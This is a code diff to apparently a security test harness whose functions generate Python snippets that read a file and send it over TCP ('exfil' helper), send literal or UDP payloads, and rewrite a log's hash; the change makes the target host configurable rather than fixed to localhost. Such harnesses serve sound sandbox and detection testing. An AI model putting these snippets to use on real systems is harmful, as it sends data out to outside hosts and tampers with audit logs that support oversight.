@@ -310,8 +310,9 @@ def _py_exfil_file(path: str, port_env: str) -> str:
     return (
         "import os, pathlib, socket\n"
         f"message = pathlib.Path({path!r}).read_text(encoding='utf-8', errors='replace')\n"
+        "host = os.environ.get('SQ3_HOST', '127.0.0.1')\n"
         f"port = int(os.environ[{port_env!r}])\n"
-        "with socket.create_connection(('127.0.0.1', port), timeout=2) as sock:\n"
+        "with socket.create_connection((host, port), timeout=2) as sock:\n"
         "    sock.sendall(message.encode('utf-8'))\n"
         "print('exfil_sent=True')\n"
     )
@@ -322,8 +323,9 @@ def _py_send_literal(port_env: str, message: str) -> str:
     return (
         "import os, socket\n"
         f"message = {message!r}\n"
+        "host = os.environ.get('SQ3_HOST', '127.0.0.1')\n"
         f"port = int(os.environ[{port_env!r}])\n"
-        "with socket.create_connection(('127.0.0.1', port), timeout=2) as sock:\n"
+        "with socket.create_connection((host, port), timeout=2) as sock:\n"
         "    sock.sendall(message.encode('utf-8'))\n"
         f"print({marker!r})\n"
     )
@@ -333,10 +335,11 @@ def _py_udp_send(port_env: str, payload: bytes) -> str:
     return (
         "import os, socket\n"
         f"payload = {payload!r}\n"
+        "host = os.environ.get('SQ3_HOST', '127.0.0.1')\n"
         f"port = int(os.environ[{port_env!r}])\n"
         "sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n"
         "sock.settimeout(2)\n"
-        "sock.sendto(payload, ('127.0.0.1', port))\n"
+        "sock.sendto(payload, (host, port))\n"
         "sock.close()\n"
         "print('udp_sent=True')\n"
     )
@@ -396,4 +399,3 @@ def _py_rewrite_log_hash(path: str) -> str:
         "path.write_text('\\n'.join(out) + '\\n', encoding='utf-8')\n"
         "print('rewrite_hash_ok=True')\n"
     )
-
